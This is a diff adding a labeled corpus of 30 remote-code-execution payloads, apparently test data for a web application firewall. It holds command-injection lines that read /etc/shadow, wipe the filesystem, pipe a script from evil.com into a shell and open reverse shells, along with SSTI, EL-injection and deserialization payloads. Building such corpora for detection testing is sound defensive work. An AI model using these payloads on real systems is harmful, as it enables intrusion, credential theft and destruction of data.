@@ -1,0 +1,38 @@
+# FortressWAF RCE Attack Corpus
+# 30 labeled RCE payloads
+# Categories: command injection, SSTI, EL injection, deserialization
+# Format: [category] payload
+
+[cmd-injection] ; cat /etc/passwd
+[cmd-injection] | cat /etc/shadow
+[cmd-injection] `cat /etc/hostname`
+[cmd-injection] $(cat /etc/passwd)
+[cmd-injection] ; rm -rf /
+[cmd-injection] | curl http://evil.com/shell.sh | sh
+[cmd-injection] `wget http://evil.com/backdoor`
+[cmd-injection] $(bash -i >& /dev/tcp/evil.com/4444 0>&1)
+[cmd-injection] ; nc -e /bin/sh evil.com 4444
+[cmd-injection] | python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+[ssti] {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+[ssti] {{''.__class__.__mro__[1].__subclasses__()}}
+[ssti] {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+[ssti] {{7*7}}
+[ssti] {{cycler.__init__.__globals__.os.popen('id').read()}}
+[ssti] {{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+[ssti] {{joiner.__init__.__globals__.os.popen('id').read()}}
+[ssti] {{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}
+[ssti] ${7*7}
+[ssti] <%= system("id") %>
+
+[el-injection] ${7*7}
+[el-injection] #{7*7}
+[el-injection] ${{7*7}}
+[el-injection] ${java.lang.Runtime.getRuntime().exec('id')}
+[el-injection] ${session.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
+[el-injection] #{session.setAttribute('test',request.getParameter('cmd'))}
+[el-injection] ${request.getParameter('cmd')}
+
+[deserialization] O:8:"stdClass":0:{}
+[deserialization] a:2:{s:4:"test";s:4:"test";s:4:"test2";R:2;}
+[deserialization] rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGlNZWRBcFNlbnRyeQCO0d0bRf5zAgADTAADa2V5dAASTGphdmEvbGFuZy9PYmplY3Q7TAALbWFwT3JkZXJ0ABJMamF2YS91dGlsL09iamVjdDtbAAZtYXBzWwALTGphdmEvdXRpbC9NYXA7eHBwdAABWnIAAAAA
